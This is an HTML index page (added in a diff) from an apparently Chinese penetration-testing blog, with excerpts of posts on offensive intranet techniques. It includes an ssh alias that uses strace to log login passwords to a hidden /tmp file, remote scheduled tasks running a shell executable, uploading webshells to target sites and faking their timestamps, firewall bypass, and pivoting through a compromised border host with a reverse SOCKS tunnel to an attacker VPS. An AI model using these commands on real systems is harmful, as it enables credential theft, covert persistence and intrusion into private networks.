@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="klion&#39;s blog"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="website" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>page - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+            <h1 id="main-title" class="title">klion's blog</h1>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/23/time-tasks/">
+                win计划任务小记 [ at schtasks ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/schtasks/">schtasks</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 关于win系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at 14:23 /every:18,19,21,24,28 c:\shell.exe  创建本地计划任务,每月的这几号的这个点执行指定的可执行程序</span></div><div class="line"><span class="comment"># at /delete /y 	删除本地所有的计划任务</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at \\192.168.3.23 14:23 /every:18,19,21,24,28 c:\shell.exe 在远程机器上创建计划任务</span></div><div class="line"><span class="comment"># at \\192.168.3.23 /delete /y 删除远程机器上的所有的计划任务</span></div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2016/09/23/time-tasks/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/22/strace/">
+                利用strace来跟踪 ssh 登陆密码
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/strace/">strace</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言<br>strace 本身其实是一个非常好用的系统调用跟踪工具,运维们可以通过它快速锁定问题的根源,但,恰巧我们也可以通过这种方式来跟踪任何进程数据,比如ssh,su,sudo,这里以跟踪ssh登陆密码为例,大家可自行脑洞更多其它用法,关于strace自身的选项作用,请<code>man strace</code>:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum install epel-release -y   利用epel源来装,直接yum可能yum不到</span></div><div class="line"><span class="comment"># yum install strace -y		如果目标机器没有装strace,那你就自己顺手给他装一个,不过像这类的调试工具,一般都会作为常用工具而被预装</span></div><div class="line"><span class="comment"># vi ~/.bashrc 			注意,这里是当前用户的环境变量配置文件,也就是说它只能对当前用户有效,不过你也可以加到全局配置中 '/etc/bashrc'</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">alias</span> ssh=<span class="string">'strace -o /tmp/.sshpwd-`date '</span>+%d%h%m%s<span class="string">'`.log -s 2048 ssh'</span></div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2016/09/22/strace/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/21/ssh-portforward/">
+                通向彼岸 之内网代理转发 [ ssh隧道 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-21</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ssh-portforwd/">ssh portforwd</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 此次用于实验的大致环境,如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">lnmp01</span> 	<span class="selector-attr">[centOS6.8_x64]</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.30</span>  	假设为自己公网的<span class="selector-tag">vps</span><span class="selector-attr">[一般都会用一台公网的linux肉鸡]</span>,等会儿主要用来负责<span class="selector-tag">ssh</span>转发</div><div class="line"><span class="selector-tag">MidLAMP</span> <span class="selector-attr">[centOS6.8_x64]</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.193</span>	假设为目标内网中的一台<span class="selector-tag">linux</span>机器,能正常连公网</div><div class="line"><span class="selector-tag">win2008cn</span>			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.170</span>	假设为目标内网中的一台<span class="selector-tag">windows</span>机器,不能连公网</div><div class="line"><span class="selector-tag">win2008R2cn</span> 			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>	假设为目标公网中的一台<span class="selector-tag">windows</span>机器,<span class="selector-tag">rdp</span>只能通过192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.x</span>这个<span class="selector-tag">ip</span>段访问</div><div class="line"><span class="selector-tag">win7en</span> 				<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.32</span><span class="selector-class">.195</span>	假设为自己本地内网中的一台<span class="selector-tag">windows</span>机器</div><div class="line"><span class="selector-tag">win7en_bak</span>			<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.17</span>	假设为自己公网的另一台<span class="selector-tag">windows</span>机器</div></pre></td></tr></table></figure></p>
+<p>0x02 关于ssh 工具本身选项用途简介 [更多详情,请自行man ssh,帮助手册里面说的非常详细]:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">C  压缩传输数据,加快传输速度</span></div><div class="line">-<span class="ruby">f  后台对用户名密码进行认证</span></div><div class="line">-<span class="ruby">N  仅仅只用来转发,不用再弹回一个新的shell</span></div><div class="line">-<span class="ruby">n  后台运行</span></div><div class="line">-<span class="ruby">q  安静模式,不要显示警告等信息</span></div><div class="line">-<span class="ruby">l  指定ssh登录名</span></div><div class="line">-<span class="ruby">g  允许远程主机连接到本地转发的端口     </span></div><div class="line">-<span class="ruby">L  进行本地端口转发</span></div><div class="line">-<span class="ruby">R  进行远程端口转发</span></div><div class="line">-<span class="ruby">D  动态转发,即socks代理</span></div><div class="line">-<span class="ruby">T  禁止分配伪终端</span></div><div class="line">-<span class="ruby">p  指定远程ssh服务端口</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/21/ssh-portforward/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/20/fpipe-redirect-port/">
+                通向彼岸 之内网代理转发 [ 利用端口重定向bypass各类应用层防火墙 fpipe ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/fpipe/">fpipe</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得netsh和iptables配置稍微有点儿繁琐,有款小工具可能会适合你,fpipe 一款专门用于端口重定向的小工具,从名字就能猜出来它是干啥的,很明显,forward pipe[转发,通过管道],虽然功能上和netsh有一点点类似,但确实不是一类东西,同样是监听来自外部的某个端口,但它多做了一步,它会把来自外部端口的流量先转到本地某个指定的端口上[转发],再通过转到的这个本地端口去连远程机器的某个端口[管道],而不是像netsh只是单纯的把端口转过去,简易通信流程如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">外部端口访问 <span class="tag">&lt;<span class="name">-</span>&gt;</span> 本地监听来自外部的这个端口并它转到本地的另一个端口上(在本地绑定两个端口) <span class="tag">&lt;<span class="name">-</span>&gt;</span> 通过本地的另一个端口和远程机器的某个端口通信</div></pre></td></tr></table></figure>
+<p>工具选项如下,非常简单,看选项说明基本就懂了:<br><img src="/img/fpipe help.png" alt=""></p>
+<p>0x02 我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙</p>
+        </div>
+        <a href="/2016/09/20/fpipe-redirect-port/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/19/iptables-portfward/">
+                通向彼岸 之内网代理转发 [ 系统篇 iptables ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/iptabbles/">iptabbles</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器</p>
+<p>0x02 环境大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">边界linux机器(centos <span class="number">6.8</span>en) 		<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为目标机器的公网ip) <span class="number">192.168</span>.<span class="number">32.129</span>(假设为目标的内网ip) </div><div class="line">要访问的内网windows机器(win <span class="number">2008</span>r2cn) 	<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> </div><div class="line">攻击者机器(win7cn) 			<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
+<p>0x03 最终目的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过边界的linux机器访问内网中的windows机器上的指定服务</div></pre></td></tr></table></figure></p>
+<p>0x04 具体过程如下,首先,编辑边界linux机器的路由转发配置文件,开启其路由转发功能<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf</span></div><div class="line"><span class="comment"># cat /etc/sysctl.conf | grep "net.ipv4.ip_forward"</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/19/iptables-portfward/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/18/netsh-portfward/">
+                通向彼岸 之内网代理转发 [ 系统篇 netsh ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/netsh/">netsh</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;除了前面提到的用一些端口转发工具来进行端口转发,其实windows系统自己也给我们提供了类似的功能,比如,其自带的防火墙管理工具<code>netsh</code>套件[确实非常实用],尤其碰到一些稍微畸形点的内网环境<br><br></p>
+<p>0x02 先来假设这么一种情况<br>&nbsp;&nbsp;&nbsp;&nbsp;当你搞定边界的一台windows机器以后,上去一看发现,机器上有两块网卡,一块外网卡,一块内网卡[先暂以正常的DMZ来讲],这时又你通过别的方式搞定了同内网的另一台windows机器,本来以为简单的种上马就可以走人了,但你发现马执行以后似乎什么都没发生,搞了半天,你才发现,原来这台内网机器根本不能连外网,说到这里,相必你也应该知道我要干啥了,没错,虽然内网的那台机器不能连外网,但它起码能跟边界的这台机器正常通信,这就够了,我们可以直接从外部通过边界这台机器来访问内网的那台不能连外网的机器<br><br><br>0x03 演示简单环境如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">目标的边界机器[win7en] 				<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.212</span>  [假设为目标公网ip] <span class="number">192.168</span>.<span class="number">32.132</span>[目标内网ip]</div><div class="line">目标内网的那台不能连外网的机器[win <span class="number">2008</span>r2cn] 	<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">32.134</span> [目标内网ip]</div><div class="line">外部的攻击者的机器[win7cn] 			<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
+<p>0x04 要实现的目的很简单:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先,可以确认的是,边界机器和攻击者机器通信正常,边界机器和目标内网的那台不能连外网的机器通信正常</div><div class="line">现在,我想通过边界机器的某个端口去访问目标内网的那台不能上外网的机器的<span class="number">3389</span>,下面是具体的操作步骤</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/18/netsh-portfward/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/16/http-tunnel-question/">
+                通向彼岸 之内网代理转发 [ http隧道篇 使用过程中容易出现的一些问题 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-16</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http-tunnel/">http tunnel</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>关于使用http隧道代理脚本时,容易出现的一些错误及解决办法</p>
+<p>0x01 如果是php程序,你可能需要先确保php.ini中的socket模块已正常开启并且可用,因为php中的socket函数要基于此模块,不过,reGeorg早已经提供了不再需要开启socket的代理脚本</p>
+<p>0x02 有时候你在绑定某些端口会遇到socket无法建立连接的问题,不妨尝试换一下端口,比如:53,8080,443,只要不跟目标系统中的现有端口冲突即可,尽量用一些穿透性比较好的端口</p>
+<p>0x03 有时还会遇到aspx 运行错误,看具体是什么错误,如果一眼解决不了,谷歌一下,解决办法肯定一大堆,比如:’Compilation Error’,可以尝试在代理脚本[即webshell]的当前所在目录,另外新建一个web.conf文件,一般也即可解决,文件具体内容如下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;configuration&gt;</div><div class="line">  &lt;system.web&gt;</div><div class="line">  &lt;customErrors mode="Off"/&gt;</div><div class="line">  &lt;/system.web&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/16/http-tunnel-question/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/15/abptts-http-tunnel/">
+                通向彼岸 之内网代理转发 [ http隧道篇 abptts ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http-tunnel/">http tunnel</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;abptts,一款基于ssl加密的http隧道工具,相对来讲还算稳定,就个人实际使用来说起码比regerog都要稳定一些,且全程通信数据加密,能一定程度上对抗取证检测,单就这一点来说,还是很赞的,不过,加不加密,它自己说的不算,还是老办法,拿wireshark自己耐心跑一遍,就一目了然了,尽量用事实说话嘛 </p>
+<p>0x02 首先,安装好工具所需的各种py依赖库:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pip install pycrypto    加密库,整个通信数据加密基本都要靠这个库来实现</span></div><div class="line"><span class="meta">#</span><span class="bash"> pip install httplib2</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2016/09/15/abptts-http-tunnel/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/14/regerog-http-tunnel/">
+                通向彼岸 之内网代理转发 [ http隧道篇 reGeorg ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http-tunnel/">http tunnel</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>reGeorg [基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:</p>
+<p>0x01 和前面都一样,先把代理[webshell]上传到目标的网站目录中再说,记得顺手改下webshell的时间戳,尝试访问该shell,返回正常后,即可本地执行绑定操作,如下<br><img src="/img/regeorg_weshell.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python regerogsocksproxy.py -u "http://目标域名/tunnel.aspx" -p 绑定的本地端口</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/regeorg_weshell_proxy.png" alt=""></p>
+<p>0x02 连接绑定好的本地端口,推荐用proxifier或者sockscap,然后往里面添加一些自己常用的内网渗透工具,就可以对目标进行正常的内网渗透了<br><img src="/img/regeorg_weshell_proxifier.png" alt=""><br><img src="/img/regeorg_weshell_res.png" alt=""></p>
+<p>0x03 实际渗透中,个人还是比较推荐用这个,比较稳定,使用也比较简单,不过,还是有些令人不太愉快的地方,待后期解决了,再单独拿出来说<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/13/tunna-http-tunnel/">
+                通向彼岸 之内网代理转发 [ http隧道篇 Tunna ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http-tunnel/">http tunnel</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>Tunna [实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]</p>
+<p>0x01 依然是先把代理端[webshell]上传到目标的网站目录中,并尝试访问该webshell,返回正常后,即可在本地执行下面的语句:<br><img src="/img/tunna_client.png" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[3389] -v </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -a 内网机器的ip -r 内网机器的指定端口 -v  </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[22] -s[转发ssh服务需要加上此选项] -v</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tunna_server.png" alt=""></p>
+<p>0x02 先连接刚才绑定到的本地端口,在尝试用mstsc,putty等工具进行连接<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> 绑定的本地端口</div></pre></td></tr></table></figure></p>
+<p><img src="/img/tunna_server_res.png" alt=""></p>
+<p>0x03 比较的不稳定,尤其是php脚本,已经不太兼容php5.3以后的版本了,而且还要开启某些模块(socket)支持,利用条件确实有点儿苛刻</p>
+<p>0x04 另外,tunna已经有相应的msf模块,也可以选择直接把它加到msf中使用<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/12/rehuh-http-tunnel/">
+                通向彼岸 之内网代理转发 [ http隧道篇 Reduh ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-12</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http-tunnel/">http tunnel</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>关于http隧道:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,所谓的http隧道[更专业的叫法 “80端口复用”],你暂时可以把它简单形象的理解成基于web端脚本实现的一个socks代理功能,只不过这个代理不用在目标端再新开一个端口而是直接复用在已有的端口(通常是web服务端口,由相应的webshell实现)上:</p>
+<p>reduh[老牌的http隧道工具,基于java,所以你需要事先装下jre]</p>
+<p>0x01 首先,把代理端[即webshell]上传到目标的网站目录中,并尝试访问,返回正常后,在本地执行:<br><img src="/img/reduh_php.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># java -jar reduhclient.jar http://目标域名/reduh.php</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/reduh_php_clinet.png" alt=""></p>
+<p>0x02 开始绑定端口,建立隧道<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># telnet 127.0.0.1 1010</span></div><div class="line">[createTunnel]要绑定到本地哪个端口上[<span class="number">8088</span>]<span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span>要绑定远程机器上的哪个端口[<span class="number">3389</span>,<span class="number">22</span>] </div><div class="line">[createTunnel]<span class="number">8088</span><span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">3389</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/reduh_php_create_tunnel.png" alt=""></p>
+<p>0x03 隧道建立成功后,即可使用 mstsc,putty 等工具连接到本地绑定的端口[此处是绑定到本地的8088],当你访问本地的8088就相当于访问目标机器的3389[你也可以换成22,以及你想代理的任何端口,前提是目标的这个端口必须先开了才行]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></div><div class="line">putty <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">8088</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/reduh_php_create_tunnel_success.png" alt=""></p>
+<p>关于reduh:<br>&nbsp;&nbsp;&nbsp;&nbsp;工具已经非常老了,应该是在很早之前,reduh的官网就已经发过相关声明,称reduh项目已经不再维护,现在已经被更好用的regerog所替代,不过,你要是实在没办法,还是可以尝试用下这个的,实际测试中,个人感觉reduh要比tunna还要好用一点,其实,所谓的好不好,跟目标实际环境和代码本身都有很大关系,这个也没必要非要分个好赖,适合自己的就是最好的,有兴趣可以仔细去详读一下工具代码<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/09/12/ssocks/">
+                通向彼岸 之内网代理转发 [ ssocks反向代理篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-12</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/socks/">socks</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:</p>
+<p>关于socks反向代理原理的简要说明:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,socks反向代理的通信原理还是比较简单的,就是在控制端和目标端同时开放一个端口,作为两端机器之间通信的这么一个专属通道[有点儿类似管道],说的再形象一点,是这样,当控制端想访问目标内网中的其他的机器的某个端口,目标端就会帮忙把要访问的那个端口的数据拿过来,放到之前已经建立好的这条通道的端口上,然后,控制端直接到这个地方来取即可,有点儿类似中介,socket嘛,本来就是个管道</p>
+<p>在linux中使用ssocks:<br>0x01 如果目标是linux机器,可能还需要你自己先编译安装下ssocks,步骤非常简单,如下,如果过程中有什么报错,仔细看下报的具体是什么错误,顺手解决下,如果是编译器或者依赖库的问题,按照相应的提示装上即可:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf ssocks-0.0.14.tar.gz</span></div><div class="line"><span class="comment"># cd ssocks-0.0.14</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
+<p>0x02 先在本地机器上执行,一般都是你自己的vps,如果开了防火墙记得把该端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sscosk_client.png" alt=""></p>
+<p>0x03 到目标机器上执行[自带台运行选项,实际渗透中可以把它加上]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sscosk_server.png" alt=""></p>
